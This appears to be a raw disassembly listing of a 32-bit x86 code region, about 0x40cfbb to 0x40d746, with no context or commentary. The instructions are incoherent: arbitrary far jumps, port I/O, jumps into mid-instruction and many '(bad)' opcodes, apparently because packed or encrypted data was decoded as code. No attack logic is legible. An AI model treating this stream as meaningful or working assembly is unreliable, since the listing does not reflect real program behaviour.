  40cfbb:	ficom  DWORD PTR [esi+0x1c1ef44c]
  40cfc1:	cmp    eax,0x7e66e7cd
  40cfc6:	out    dx,al
  40cfc7:	loop   0x40cfb0
  40cfc9:	jl     0x40cfe9
  40cfcb:	imul   ebp,DWORD PTR [ecx+0x278d16cd],0xb75e9951
  40cfd5:	out    dx,eax
  40cfd6:	push   0x9d100a85
  40cfdb:	je     0x40d02d
  40cfdd:	mov    eax,0xaf48e957
  40cfe2:	pop    ecx
  40cfe3:	bound  ebx,QWORD PTR [ebp+0x3a2b68e0]
  40cfe9:	xchg   ebx,eax
  40cfea:	xor    al,0xf7
  40cfec:	(bad)  
  40cfed:	fst    DWORD PTR [edx]
  40cfef:	add    al,BYTE PTR [esi]
  40cff1:	add    DWORD PTR [ecx],ebx
  40cff3:	cmp    DWORD PTR [ebx-0x2b1a9172],esp
  40cff9:	pushf  
  40cffa:	mov    edi,0xf38a881b
  40cfff:	or     eax,0xbf402f70
  40d004:	je     0x40cfa6
  40d006:	sub    BYTE PTR [eax],cl
  40d008:	push   ecx
  40d009:	inc    eax
  40d00a:	out    0xa4,eax
  40d00c:	adc    DWORD PTR [edx-0x563e9003],esp
  40d012:	dec    eax
  40d013:	idiv   DWORD PTR [ebx+eax*2+0x3d]
  40d017:	cmp    dl,dl
  40d019:	xchg   ebx,eax
  40d01a:	clc    
  40d01b:	mov    al,cl
  40d01d:	test   al,0x73
  40d01f:	and    cl,BYTE PTR [ebx-0x415658b2]
  40d025:	cmp    al,BYTE PTR ds:0xfdca1d21
  40d02b:	mov    ebx,0xff6588f6
  40d030:	jmp    0x1eae:0x9632ae71
  40d037:	dec    eax
  40d038:	mov    dh,0x80
  40d03a:	mov    al,cl
  40d03c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d03d:	out    dx,al
  40d03e:	mov    ch,0x82
  40d040:	aad    0xc7
  40d042:	ret    
  40d043:	int3   
  40d044:	data16 or bh,al
  40d047:	shr    ecx,cl
  40d049:	stos   DWORD PTR es:[edi],eax
  40d04a:	jbe    0x40cfe1
  40d04c:	inc    ecx
  40d04d:	lahf   
  40d04e:	mov    eax,edi
  40d050:	jnp    0x40cffa
  40d052:	xchg   ebp,eax
  40d053:	pop    edx
  40d054:	loopne 0x40d016
  40d056:	dec    ebp
  40d057:	sub    BYTE PTR [ebx],ch
  40d059:	xchg   al,bl
  40d05b:	jl     0x40d032
  40d05d:	fmul   DWORD PTR [edx]
  40d05f:	mov    ebx,0x2bafa9a8
  40d064:	retf   
  40d065:	pop    ds
  40d066:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d067:	pusha  
  40d068:	inc    eax
  40d069:	jns    0x40d068
  40d06b:	mov    ?,edi
  40d06d:	cmp    BYTE PTR [ebx+0x5f],dl
  40d070:	sti    
  40d071:	push   edi
  40d072:	sar    ah,0xe1
  40d075:	push   esp
  40d076:	jae    0x40d09d
  40d078:	shl    DWORD PTR [eax-0x38],1
  40d07b:	aam    0x8f
  40d07d:	arpl   WORD PTR [ecx],ax
  40d07f:	lds    edx,FWORD PTR ds:[ebx]
  40d082:	dec    ecx
  40d083:	fisttp DWORD PTR [edi-0x54ebebd6]
  40d089:	fstp   QWORD PTR [edi-0x4ced83e0]
  40d08f:	add    eax,0x776e255d
  40d094:	cwde   
  40d095:	mov    ah,0x22
  40d097:	add    al,0xb1
  40d099:	jbe    0x40d039
  40d09b:	mov    ebx,0x4ba9bbce
  40d0a0:	into   
  40d0a1:	mov    eax,ds:0x3bfead47
  40d0a6:	add    BYTE PTR [esp+ecx*1-0x13],0xde
  40d0ab:	cwde   
  40d0ac:	mov    dl,0xfd
  40d0ae:	jbe    0x40d0d3
  40d0b0:	mov    dh,0x2f
  40d0b2:	(bad)  
  40d0b3:	pop    esp
  40d0b4:	mov    DWORD PTR [eax],ebp
  40d0b6:	imul   eax,DWORD PTR [ebx+0x64aa39f6],0x92049caa
  40d0c0:	test   ebx,0xec689c65
  40d0c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d0c7:	sub    al,0x68
  40d0c9:	ds xchg ecx,eax
  40d0cb:	ins    BYTE PTR es:[edi],dx
  40d0cc:	lock push cs
  40d0ce:	dec    eax
  40d0cf:	or     eax,0x1ec7c63f
  40d0d4:	jns    0x40d0cc
  40d0d6:	jmp    0x54e6:0x3408682b
  40d0dd:	imul   edx,DWORD PTR [edx],0x31c42efe
  40d0e3:	sbb    DWORD PTR [edi],ebx
  40d0e5:	adc    eax,0xd4c3b3a0
  40d0ea:	xor    DWORD PTR [ecx-0x5f602f7a],esi
  40d0f0:	addr16 in eax,0x34
  40d0f3:	dec    ecx
  40d0f4:	pop    esp
  40d0f5:	scas   eax,DWORD PTR es:[edi]
  40d0f6:	pusha  
  40d0f7:	push   ebx
  40d0f8:	push   edi
  40d0f9:	aam    0xad
  40d0fb:	jp     0x40d0d2
  40d0fd:	cdq    
  40d0fe:	add    esp,DWORD PTR [ecx+0x6c]
  40d101:	mov    dl,0xe7
  40d103:	retf   0xb48
  40d106:	inc    edx
  40d107:	stc    
  40d108:	(bad)  
  40d109:	(bad)  
  40d10a:	dec    ebx
  40d10b:	enter  0x622e,0x73
  40d10f:	or     ah,BYTE PTR [edx+0x32]
  40d112:	cmc    
  40d113:	push   edi
  40d114:	jmp    eax
  40d116:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d117:	outs   dx,BYTE PTR ds:[esi]
  40d118:	push   esp
  40d119:	bound  edi,QWORD PTR [eax-0x32]
  40d11c:	push   cs
  40d11d:	fild   QWORD PTR [esi]
  40d11f:	pop    eax
  40d120:	inc    edx
  40d121:	out    dx,eax
  40d122:	outs   dx,DWORD PTR ds:[esi]
  40d123:	push   esp
  40d124:	mov    edx,0xb4282262
  40d129:	(bad)  
  40d12a:	rol    BYTE PTR [esi],1
  40d12c:	mov    WORD PTR [eax-0x3f],es
  40d12f:	pop    edx
  40d130:	fist   WORD PTR [ebx+0x56]
  40d133:	cs mov esi,0x15304ae2
  40d139:	stc    
  40d13a:	xchg   esp,eax
  40d13b:	aas    
  40d13c:	fcomp  QWORD PTR [eax-0x71]
  40d13f:	aas    
  40d140:	addr16 mov dh,0x29
  40d143:	pop    ds
  40d144:	retf   
  40d145:	jge    0x40d1c2
  40d147:	aad    0x55
  40d149:	adc    eax,0xa6ccfa1a
  40d14e:	fs jecxz 0x40d1b2
  40d151:	xchg   ebx,eax
  40d152:	loopne 0x40d198
  40d154:	jmp    0x40d0d7
  40d156:	jp     0x40d163
  40d158:	and    ebp,edi
  40d15a:	jo     0x40d19c
  40d15c:	(bad)  [esi+0x1d0b315d]
  40d162:	and    BYTE PTR [ebx+ebx*1],0xbe
  40d166:	sub    edi,edi
  40d168:	or     ecx,DWORD PTR [ebp+0x65]
  40d16b:	mov    ds:0x7b2488e8,eax
  40d170:	push   0x6198f09f
  40d175:	jnp    0x40d16c
  40d177:	sub    dl,BYTE PTR [ecx-0x64]
  40d17a:	fnop   
  40d17c:	dec    esp
  40d17d:	and    bl,BYTE PTR [ebx]
  40d17f:	mov    ch,0x11
  40d181:	and    BYTE PTR [edx],0x1
  40d184:	stc    
  40d185:	cld    
  40d186:	add    esi,DWORD PTR [eax+0x3d1663f]
  40d18c:	dec    DWORD PTR [edx]
  40d18e:	jmp    0xbe3:0xef550821
  40d195:	sub    ecx,DWORD PTR [esp+eax*8+0x5ff46122]
  40d19c:	jmp    0xe2ef:0xaf3ffea8
  40d1a3:	mov    cl,0xe5
  40d1a5:	dec    edi
  40d1a6:	test   al,0xa0
  40d1a8:	and    dl,BYTE PTR [edx]
  40d1aa:	in     al,0x9e
  40d1ac:	jmp    0xb0d8:0x4afa9ae5
  40d1b3:	cmp    al,0xec
  40d1b5:	pop    esi
  40d1b6:	stos   BYTE PTR es:[edi],al
  40d1b7:	mov    esi,0x83c6752
  40d1bc:	es xchg ecx,eax
  40d1be:	jmp    0xd27fd921
  40d1c3:	or     BYTE PTR [esi],bl
  40d1c5:	jmp    0x31d2560a
  40d1ca:	shr    DWORD PTR [edx+0x66659744],cl
  40d1d0:	sbb    ch,BYTE PTR [esi+eiz*2+0x53]
  40d1d4:	xchg   edx,eax
  40d1d5:	or     dl,0xa
  40d1d8:	cmp    BYTE PTR [edi],0x1a
  40d1db:	in     al,dx
  40d1dc:	stos   BYTE PTR es:[edi],al
  40d1dd:	push   esi
  40d1de:	rcr    dl,cl
  40d1e0:	push   0xd30491de
  40d1e5:	mov    ecx,0xacd4bb87
  40d1ea:	std    
  40d1eb:	xor    eax,0x50fde460
  40d1f0:	fsubr  DWORD PTR es:[ebx+0x6d70a957]
  40d1f7:	repnz mov cl,0x30
  40d1fa:	inc    ebp
  40d1fb:	sub    bh,BYTE PTR gs:[eax+0x3]
  40d1ff:	jo     0x40d21a
  40d201:	not    BYTE PTR [ebx+0x1ac2696a]
  40d207:	ret    0xa64d
  40d20a:	push   es
  40d20b:	add    esi,eax
  40d20d:	test   al,0x6e
  40d20f:	int    0x79
  40d211:	pop    es
  40d212:	lods   al,BYTE PTR ds:[esi]
  40d213:	ficom  DWORD PTR [ebx-0x11a106]
  40d219:	ffreep st(3)
  40d21b:	test   al,0x16
  40d21d:	mov    ch,0x96
  40d21f:	sub    BYTE PTR [ecx+0x6e],al
  40d222:	pushf  
  40d223:	ror    DWORD PTR [edi],0x44
  40d226:	loopne 0x40d26b
  40d228:	into   
  40d229:	cmp    esp,DWORD PTR [ecx]
  40d22b:	jb     0x40d2a6
  40d22d:	out    dx,eax
  40d22e:	xchg   ebx,eax
  40d22f:	xchg   DWORD PTR [edi],eax
  40d231:	inc    edx
  40d232:	adc    ch,ch
  40d234:	sub    dh,BYTE PTR [edi+0x0]
  40d237:	addr16 adc cl,bh
  40d23a:	or     BYTE PTR [edx-0x50],al
  40d23d:	add    edx,DWORD PTR [ebp-0x6c3776f4]
  40d243:	or     al,BYTE PTR [ebx+0x1e6bddd4]
  40d249:	out    dx,eax
  40d24a:	call   0x3eaa:0xc20eb140
  40d251:	sbb    ebx,edi
  40d253:	mov    ah,0xdd
  40d255:	pop    ss
  40d256:	sbb    al,0xd8
  40d258:	les    esp,FWORD PTR [edi]
  40d25a:	clc    
  40d25b:	loope  0x40d2c8
  40d25d:	xchg   ecx,eax
  40d25e:	xor    bh,bl
  40d260:	pushf  
  40d261:	sbb    dl,dh
  40d263:	push   0x99c44f6
  40d268:	jmp    0x40d205
  40d26a:	cmp    eax,0xda2e91d4
  40d26f:	into   
  40d270:	ss retf 0xdf8f
  40d274:	stc    
  40d275:	es mov ah,0x6
  40d278:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d279:	xchg   ecx,eax
  40d27a:	push   esi
  40d27b:	inc    ebp
  40d27c:	loope  0x40d29d
  40d27e:	fisttp WORD PTR [eax-0x1c]
  40d281:	and    al,cl
  40d283:	popf   
  40d284:	sub    eax,0x8a435760
  40d289:	shl    DWORD PTR [ecx],1
  40d28b:	and    al,0x38
  40d28d:	inc    ebx
  40d28e:	mov    ebp,0x54d45468
  40d293:	ja     0x40d24f
  40d295:	aad    0xf8
  40d297:	repz daa 
  40d299:	xchg   ebx,eax
  40d29a:	and    esp,DWORD PTR [edi]
  40d29c:	jecxz  0x40d298
  40d29e:	add    ah,BYTE PTR [edx]
  40d2a0:	push   esi
  40d2a1:	adc    al,ah
  40d2a3:	mov    WORD PTR [ecx+0xe],cs
  40d2a6:	pop    edi
  40d2a7:	jle    0x40d246
  40d2a9:	pop    ds
  40d2aa:	xchg   edi,eax
  40d2ab:	dec    ebp
  40d2ac:	inc    edi
  40d2ad:	push   cs
  40d2ae:	retw   
  40d2b0:	inc    ebx
  40d2b1:	icebp  
  40d2b2:	adc    dh,BYTE PTR [esi+eiz*2]
  40d2b5:	mov    esp,DWORD PTR [ebp+0xf6a715e]
  40d2bb:	xchg   DWORD PTR [ecx+0x23],ebx
  40d2be:	leave  
  40d2bf:	out    0x9d,eax
  40d2c1:	and    ebp,DWORD PTR [edi-0x6490372]
  40d2c7:	ret    0x99d0
  40d2ca:	out    0xf8,al
  40d2cc:	dec    ebx
  40d2cd:	out    dx,al
  40d2ce:	lock loope 0x40d30a
  40d2d1:	ins    BYTE PTR es:[edi],dx
  40d2d2:	div    BYTE PTR [edi+0x15]
  40d2d5:	cmc    
  40d2d6:	out    dx,eax
  40d2d7:	push   ecx
  40d2d8:	cmp    eax,0xf7b8e98a
  40d2dd:	adc    edx,ebp
  40d2df:	daa    
  40d2e0:	mov    dh,BYTE PTR [ecx]
  40d2e2:	and    al,0xfe
  40d2e4:	loope  0x40d28a
  40d2e6:	pop    ebp
  40d2e7:	jo     0x40d30f
  40d2e9:	cmp    edx,esp
  40d2eb:	pop    edx
  40d2ec:	dec    ebp
  40d2ed:	mov    ah,BYTE PTR [ecx]
  40d2ef:	xchg   ebx,eax
  40d2f0:	int    0xef
  40d2f2:	sbb    bl,dl
  40d2f4:	and    DWORD PTR [eax],ecx
  40d2f6:	mov    esi,0x6be2489b
  40d2fb:	call   0x406c:0x98e0982e
  40d302:	push   0xffffffc9
  40d304:	push   esi
  40d306:	enter  0x9f67,0xd4
  40d30a:	cli    
  40d30b:	xlat   BYTE PTR ss:[ebx]
  40d30d:	pop    ebx
  40d30e:	out    dx,al
  40d30f:	cmp    BYTE PTR [ecx-0x59],dl
  40d312:	xchg   BYTE PTR [eax-0x39],cl
  40d315:	mov    eax,ds:0xdddf53f4
  40d31a:	test   al,0x34
  40d31c:	and    eax,0x64fa3388
  40d321:	iret   
  40d322:	pop    ecx
  40d323:	ret    0x8052
  40d326:	mov    BYTE PTR [ecx],ch
  40d328:	lods   al,BYTE PTR ds:[esi]
  40d329:	mov    ecx,DWORD PTR [ebx+0xa]
  40d32c:	or     DWORD PTR [esp+ecx*1+0x8],ecx
  40d330:	callw  0x92b6
  40d334:	retf   
  40d335:	push   cs
  40d336:	leave  
  40d337:	inc    ecx
  40d338:	inc    ebx
  40d339:	adc    eax,0x35e1323b
  40d33e:	nop
  40d33f:	test   BYTE PTR [esi+0x19ac5e1a],ch
  40d345:	mov    ds:0x117b778d,eax
  40d34a:	add    bh,dh
  40d34c:	das    
  40d34d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d34e:	mov    edx,0x61b6c11c
  40d353:	arpl   cx,ax
  40d355:	lods   eax,DWORD PTR ds:[esi]
  40d356:	jg     0x40d393
  40d358:	mov    dh,0xab
  40d35a:	mov    ebp,0x7a2e2425
  40d35f:	jne    0x40d3b4
  40d361:	hlt    
  40d362:	les    esi,FWORD PTR [esi+eax*1]
  40d365:	inc    ebp
  40d366:	lods   eax,DWORD PTR ds:[esi]
  40d367:	xchg   BYTE PTR [esi],al
  40d369:	inc    ebx
  40d36a:	out    0xed,al
  40d36c:	leave  
  40d36d:	out    0x6b,eax
  40d36f:	xor    DWORD PTR [esi-0x7d],edi
  40d372:	mov    al,ds:0x5f09e8cb
  40d377:	mov    esp,0x80178153
  40d37c:	sub    edi,DWORD PTR [ebx-0x3e91c2f5]
  40d382:	mov    eax,ds:0xa704f191
  40d387:	jecxz  0x40d3c6
  40d389:	nop
  40d38a:	xchg   edi,eax
  40d38b:	and    BYTE PTR [eax-0x2cd4f696],0xe4
  40d392:	jp     0x40d327
  40d394:	jmp    0x5ae06529
  40d399:	push   0x16
  40d39b:	nop
  40d39c:	lock test ebx,esi
  40d39f:	mov    ebp,0xfb9d50aa
  40d3a4:	test   DWORD PTR [eax+0x35],ecx
  40d3a7:	xchg   DWORD PTR [ecx-0x2],eax
  40d3aa:	inc    eax
  40d3ab:	mov    dl,0x90
  40d3ad:	jge    0x40d3ef
  40d3af:	cli    
  40d3b0:	cmp    BYTE PTR [ebp+0x5f7e1c8f],ah
  40d3b6:	sub    al,0x6f
  40d3b8:	aad    0xf4
  40d3ba:	ins    DWORD PTR es:[edi],dx
  40d3bb:	add    eax,0x681a05c1
  40d3c0:	fadd   QWORD PTR es:[edx+ebx*2]
  40d3c4:	pusha  
  40d3c5:	addr16 pop ss
  40d3c7:	push   edi
  40d3c8:	and    eax,DWORD PTR [edi]
  40d3ca:	daa    
  40d3cb:	add    al,0xe8
  40d3cd:	mov    cl,0x83
  40d3cf:	sbb    cl,BYTE PTR ss:[ecx+ecx*1]
  40d3d3:	daa    
  40d3d4:	ret    0x3868
  40d3d7:	jecxz  0x40d429
  40d3d9:	ss ret 
  40d3db:	dec    ecx
  40d3dc:	jmp    0x40d452
  40d3de:	sbb    eax,0x40e5924e
  40d3e3:	cmp    al,0x15
  40d3e5:	sbb    DWORD PTR [ebp+0x1],0xa901a055
  40d3ec:	pop    eax
  40d3ed:	test   eax,0xd9194dac
  40d3f2:	dec    edx
  40d3f3:	sub    ebp,DWORD PTR [ebx+eiz*8]
  40d3f6:	sub    al,0x45
  40d3f8:	icebp  
  40d3f9:	jbe    0x40d459
  40d3fb:	in     eax,dx
  40d3fc:	and    edi,DWORD PTR [edi+0x71]
  40d3ff:	mov    WORD PTR [esi-0x13],gs
  40d402:	stc    
  40d403:	pop    esp
  40d404:	cli    
  40d405:	ins    BYTE PTR es:[edi],dx
  40d406:	push   ebp
  40d407:	cmp    ebx,DWORD PTR [ecx-0x21]
  40d40a:	push   cs
  40d40b:	fisubr DWORD PTR [esp+ebp*4]
  40d40e:	mov    edi,0x61c15a57
  40d413:	je     0x40d3de
  40d415:	inc    ebp
  40d416:	fcomp  DWORD PTR [ecx]
  40d418:	jne    0x40d39b
  40d41a:	ss push esi
  40d41c:	repnz sub BYTE PTR ds:0xfb6de9ec,0xcb
  40d424:	cs cs xchg esp,eax
  40d427:	xor    DWORD PTR [eax+eax*4-0x243f051c],edx
  40d42e:	adc    edi,DWORD PTR [ebx]
  40d430:	repnz inc edi
  40d432:	cmp    al,al
  40d434:	in     eax,0x65
  40d436:	xor    edi,DWORD PTR [ebx+0x62a97dbf]
  40d43c:	or     dh,BYTE PTR [eax]
  40d43e:	stos   DWORD PTR es:[edi],eax
  40d43f:	pop    edi
  40d440:	call   0xb263:0x23c5bf48
  40d447:	and    cl,BYTE PTR [esi+0x77ed34fe]
  40d44d:	fadd   QWORD PTR [edx]
  40d44f:	call   0x7d31:0xddc2597c
  40d456:	idiv   DWORD PTR [ebx+0x49]
  40d459:	out    0x69,al
  40d45b:	mov    ah,BYTE PTR [ecx-0x1dcdb984]
  40d461:	mov    ebx,0xd19a6057
  40d466:	inc    ecx
  40d467:	fs or  eax,0xca611e99
  40d46d:	gs cmp eax,0xd9c54ebc
  40d473:	(bad)  
  40d474:	sub    ebx,DWORD PTR [edi]
  40d476:	pop    edi
  40d477:	pop    ebp
  40d478:	xchg   DWORD PTR [eax+0x1],edx
  40d47b:	(bad)  
  40d47c:	cmp    BYTE PTR [ecx],bh
  40d47e:	or     DWORD PTR [edx],edi
  40d480:	dec    esp
  40d481:	cmp    eax,0xec1936b2
  40d486:	je     0x40d507
  40d488:	and    ah,BYTE PTR [ecx+0x5b9245e2]
  40d48e:	sbb    al,0x96
  40d490:	shl    BYTE PTR [esi],cl
  40d492:	test   DWORD PTR [edx-0x5f],eax
  40d495:	xor    DWORD PTR [edi],esp
  40d497:	jmp    0x40d48d
  40d499:	out    dx,al
  40d49a:	imul   edi,esi,0x46
  40d49d:	push   esi
  40d49e:	retf   0x88c7
  40d4a1:	repnz (bad) 
  40d4a4:	xchg   BYTE PTR [eax-0x68a6bc37],bh
  40d4aa:	arpl   WORD PTR [ecx+0x19],bx
  40d4ad:	jg     0x40d448
  40d4af:	imul   eax,DWORD PTR [esi],0xe8e5afc4
  40d4b5:	leave  
  40d4b6:	sbb    BYTE PTR [esi+0x24],al
  40d4b9:	mov    eax,0x10a4e487
  40d4be:	loopne 0x40d4f0
  40d4c0:	add    BYTE PTR [ebx-0x21a2602b],cl
  40d4c6:	jp     0x40d46a
  40d4c8:	pop    edx
  40d4c9:	mov    cs,ebx
  40d4cb:	hlt    
  40d4cc:	jmp    0x9c3e:0x825063e1
  40d4d3:	mov    cl,0xf4
  40d4d5:	inc    ecx
  40d4d6:	push   ecx
  40d4d7:	rcl    BYTE PTR [edx],0x3a
  40d4da:	bound  ecx,QWORD PTR [edi]
  40d4dc:	sbb    DWORD PTR [edx+0x6b],ecx
  40d4df:	inc    ecx
  40d4e0:	pop    edx
  40d4e1:	aas    
  40d4e2:	in     al,dx
  40d4e3:	xchg   ebx,eax
  40d4e4:	xchg   ebx,eax
  40d4e5:	mov    eax,ds:0x70ad4a4d
  40d4ea:	nop
  40d4eb:	(bad)  
  40d4ec:	mov    WORD PTR [ebp+0x12fefa55],es
  40d4f2:	neg    DWORD PTR [ebx-0x6805433a]
  40d4f8:	mov    ch,0x7f
  40d4fa:	ror    DWORD PTR [esi+0x31],cl
  40d4fd:	jmp    0x40d577
  40d4ff:	xchg   ebp,eax
  40d500:	pop    esi
  40d501:	xor    eax,ebx
  40d503:	pop    ecx
  40d504:	out    0xd4,eax
  40d506:	push   ds
  40d507:	mov    esp,0x9f2fc25e
  40d50c:	rcr    ebp,0x77
  40d50f:	inc    BYTE PTR [eax]
  40d511:	fsub   st(3),st
  40d513:	sub    al,0x38
  40d515:	mov    bh,0x79
  40d517:	jno    0x40d4d9
  40d519:	ficomp WORD PTR ds:0x120a6515
  40d51f:	adc    DWORD PTR [edx],edx
  40d521:	push   edi
  40d522:	ret    0x39be
  40d525:	push   eax
  40d526:	jns    0x40d4b7
  40d528:	nop
  40d529:	fbld   TBYTE PTR [edi-0xa]
  40d52c:	imul   edi,DWORD PTR [eax+edi*1+0x39],0x82fc0901
  40d534:	imul   edi,DWORD PTR [edx+0x2646cc26],0x61da3eac
  40d53e:	repz frstor ds:0x748962ec
  40d545:	ins    BYTE PTR es:[edi],dx
  40d546:	(bad)  [ecx+eax*8-0x64c14cf6]
  40d54d:	mov    ds:0x1ea5082c,al
  40d552:	sbb    ebp,esp
  40d554:	jne    0x40d5a6
  40d556:	jbe    0x40d564
  40d558:	jle    0x40d5b5
  40d55a:	retf   0x5408
  40d55d:	iret   
  40d55e:	push   ecx
  40d55f:	mov    dl,0x70
  40d561:	icebp  
  40d562:	lods   al,BYTE PTR ds:[esi]
  40d563:	push   ss
  40d564:	mov    esp,0x1b0b93cd
  40d569:	sub    BYTE PTR [ebx+0x49],cl
  40d56c:	ret    
  40d56d:	cmp    ch,BYTE PTR [ecx-0xcc249d3]
  40d573:	std    
  40d574:	loop   0x40d54e
  40d576:	das    
  40d577:	add    bh,BYTE PTR [edx]
  40d579:	mov    bl,0xaa
  40d57b:	jp     0x40d5a0
  40d57d:	inc    esp
  40d57e:	add    al,0x69
  40d580:	idiv   ah
  40d582:	push   ebx
  40d583:	push   ds
  40d584:	adc    al,dh
  40d586:	xor    ecx,DWORD PTR [esi+0x36]
  40d589:	pop    ss
  40d58a:	fidivr WORD PTR [esi-0x22aecc2c]
  40d590:	push   edx
  40d591:	out    dx,al
  40d592:	sub    DWORD PTR [edx-0x5a],esi
  40d595:	mov    ebx,0x9e4ec4d9
  40d59a:	push   ebx
  40d59b:	xor    eax,0x6a3bb041
  40d5a0:	inc    eax
  40d5a1:	xor    edx,DWORD PTR [esi]
  40d5a3:	sub    ch,dh
  40d5a5:	push   0xfb0b45db
  40d5aa:	sbb    cl,BYTE PTR [edx]
  40d5ac:	jnp    0x40d544
  40d5ae:	jmp    0x40d536
  40d5b0:	jge    0x40d559
  40d5b2:	cld    
  40d5b3:	jno    0x40d62a
  40d5b5:	in     al,dx
  40d5b6:	add    BYTE PTR [ebp-0x55],bl
  40d5b9:	xchg   esp,eax
  40d5ba:	jmp    0x40d61d
  40d5bc:	dec    esp
  40d5bd:	scas   eax,DWORD PTR es:[edi]
  40d5be:	mov    esp,DWORD PTR [eax+eax*2]
  40d5c1:	fcomp  st(5)
  40d5c3:	in     al,dx
  40d5c4:	cmp    ah,BYTE PTR [ebx+ebp*1-0x7a]
  40d5c8:	and    dl,BYTE PTR [edi-0x62]
  40d5cb:	dec    esi
  40d5cc:	les    esi,FWORD PTR [di+0x72]
  40d5d0:	jle    0x40d593
  40d5d2:	mov    ah,0x3f
  40d5d4:	fisub  WORD PTR [esi+0x6adae502]
  40d5da:	mov    ecx,0xcfa32587
  40d5df:	adc    BYTE PTR [ebx+0x5b],bl
  40d5e2:	mov    ds:0xdd7be103,eax
  40d5e7:	mov    ah,0x20
  40d5e9:	sub    BYTE PTR [ecx-0x5d],dh
  40d5ec:	mov    ds:0x1f5edffa,eax
  40d5f1:	cs test al,0xbd
  40d5f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d5f5:	mov    ebp,0xdecc5530
  40d5fa:	mov    al,0xfb
  40d5fc:	inc    ebp
  40d5fd:	jp     0x40d5f6
  40d5ff:	hlt    
  40d600:	mov    bl,0x65
  40d602:	pushf  
  40d603:	pop    edx
  40d604:	sbb    edi,DWORD PTR [ecx+esi*1+0x2e]
  40d608:	sub    BYTE PTR [ebx+0x13478dbd],ch
  40d60e:	sbb    esp,eax
  40d610:	adc    eax,ebp
  40d612:	push   ebx
  40d613:	pusha  
  40d614:	cmp    al,0x35
  40d616:	retf   0xdba
  40d619:	leave  
  40d61a:	dec    edx
  40d61b:	mov    edx,0xb366ed5f
  40d620:	mov    ds:0x4608d8f9,al
  40d625:	test   eax,0x57a7ac53
  40d62a:	jmp    0xbb16:0x8ff19e73
  40d631:	jns    0x40d674
  40d633:	repnz push ds
  40d635:	adc    al,0x4
  40d637:	push   eax
  40d638:	aam    0x6a
  40d63a:	or     ah,BYTE PTR [eax]
  40d63c:	mov    esp,0x8276034d
  40d641:	cmp    eax,0xc54f8aab
  40d646:	adc    BYTE PTR [ecx],0x4
  40d649:	and    eax,0xa7cbaf8c
  40d64e:	popa   
  40d64f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d650:	popa   
  40d651:	jge    0x40d695
  40d653:	bswap  edx
  40d655:	(bad)  
  40d656:	jge    0x40d64f
  40d658:	sub    BYTE PTR [edi-0x1f448628],bh
  40d65e:	fcomp  st(4)
  40d660:	sbb    ch,BYTE PTR [ebp+0x61357f1c]
  40d666:	pop    esp
  40d667:	lock fs in eax,dx
  40d66a:	and    eax,DWORD PTR [ebx-0x77]
  40d66d:	leave  
  40d66e:	add    ebx,0x5b
  40d671:	xor    ecx,0x3a
  40d674:	leave  
  40d675:	fldenv [edx]
  40d677:	xor    BYTE PTR [ebp+0x7e],dl
  40d67a:	mov    ds:0xd7fb9ace,al
  40d67f:	dec    ebp
  40d680:	clc    
  40d681:	mov    DWORD PTR [edx+esi*4-0x28],ebp
  40d685:	jle    0x40d671
  40d687:	jp     0x40d6ec
  40d689:	iret   
  40d68a:	jmp    0x40d6e7
  40d68c:	and    BYTE PTR [ecx],ah
  40d68e:	sbb    ebx,eax
  40d690:	inc    edi
  40d691:	mov    ds:0xe01c0be2,eax
  40d696:	fistp  DWORD PTR [ecx]
  40d698:	push   0xd17c54ca
  40d69d:	add    al,0xd2
  40d69f:	bnd gs jno 0x40d6d2
  40d6a3:	arpl   WORD PTR [eax],sp
  40d6a5:	pcmpgtb mm5,QWORD PTR [eax+0x18b230f0]
  40d6ac:	dec    esp
  40d6ad:	jle    0x40d71c
  40d6af:	add    DWORD PTR [ebx],0xf0a8bf9c
  40d6b5:	jnp    0x40d68a
  40d6b7:	mov    edi,0x3bde999
  40d6bc:	fcomp  DWORD PTR [esi+0x7ef235f]
  40d6c2:	icebp  
  40d6c3:	pop    ss
  40d6c4:	rcl    BYTE PTR [ecx],1
  40d6c6:	pusha  
  40d6c7:	in     eax,dx
  40d6c8:	push   cs
  40d6c9:	(bad)  
  40d6ca:	push   ss
  40d6cb:	sub    BYTE PTR [eax],al
  40d6cd:	jp     0x40d747
  40d6cf:	push   eax
  40d6d0:	mov    al,ds:0xa7e90338
  40d6d5:	add    BYTE PTR [edi+0x3e967bad],dh
  40d6db:	mov    ecx,0x146ecda9
  40d6e0:	rol    ch,0x2
  40d6e3:	lods   eax,DWORD PTR ds:[esi]
  40d6e4:	mov    ebp,0xbb2b1c64
  40d6e9:	sub    al,0x4a
  40d6eb:	pop    esp
  40d6ec:	fcomp  QWORD PTR [esp+edx*8+0x8]
  40d6f0:	es dec ebx
  40d6f2:	dec    ecx
  40d6f3:	add    al,0xcc
  40d6f5:	(bad)  
  40d6f6:	fwait
  40d6f7:	sbb    ebx,DWORD PTR [ebp-0x46]
  40d6fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d6fb:	leave  
  40d6fc:	je     0x40d77a
  40d6fe:	mov    cl,0xad
  40d700:	fmul   QWORD PTR [ebx+0x5]
  40d703:	repnz add esi,esi
  40d706:	dec    esp
  40d707:	mov    edi,0xab900f8f
  40d70c:	scas   eax,DWORD PTR es:[edi]
  40d70d:	sub    eax,0xfe98c5d6
  40d712:	bnd call 0xb3321a4e
  40d718:	jecxz  0x40d754
  40d71a:	pop    esp
  40d71b:	xchg   ebp,eax
  40d71c:	sub    BYTE PTR [edi+0x7b],bh
  40d71f:	or     BYTE PTR [edi+0x1f46f3f6],bl
  40d725:	sub    eax,0xac77c8f1
  40d72a:	pop    es
  40d72b:	mov    esp,0xe7dcfebb
  40d730:	dec    ebx
  40d731:	bound  eax,QWORD PTR [edx+0xb]
  40d734:	iret   
  40d735:	fidivr WORD PTR [edx+0x7a]
  40d738:	enter  0x94fb,0xa7
  40d73c:	outs   dx,DWORD PTR ds:[esi]
  40d73d:	les    ebx,FWORD PTR [esi-0x2c]
  40d740:	xchg   ebx,eax
  40d741:	icebp  
  40d742:	(bad)  [ebx-0x2d]
  40d745:	pop    ds
  40d746:	not    DWORD PTR [ebx+0x48]
